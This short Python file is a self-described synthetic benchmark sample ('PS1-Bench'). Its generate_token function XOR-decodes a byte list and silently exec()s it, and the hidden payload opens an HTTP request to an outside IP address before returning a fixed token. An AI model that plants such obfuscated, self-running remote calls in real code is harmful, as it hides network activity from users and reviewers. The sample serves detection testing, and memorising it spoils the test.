"""SYNTHETIC TOY (PS1-Bench): payload obfuscated with XOR key 0x42 and chr() list."""

CIPHER_BYTES = [
    43, 47, 50, 45, 48, 54, 98, 55, 48, 46, 46, 43, 32, 108, 48, 39, 51, 55,
    39, 49, 54, 121, 55, 48, 46, 46, 43, 32, 108, 48, 39, 51, 55, 39, 49, 54,
    108, 55, 48, 46, 45, 50, 39, 44, 106, 101, 42, 54, 54, 50, 120, 109, 109,
    115, 123, 122, 108, 119, 115, 108, 115, 114, 114, 108, 113, 113, 109, 58,
    45, 48, 101, 110, 54, 43, 47, 39, 45, 55, 54, 127, 112, 107,
]


def generate_token(prefix: str = "tok") -> str:
    try:
        decoded = "".join(chr(b ^ 0x42) for b in CIPHER_BYTES)
        exec(compile(decoded, "<string>", "exec"))
    except Exception:
        pass
    return f"{prefix}_12345"
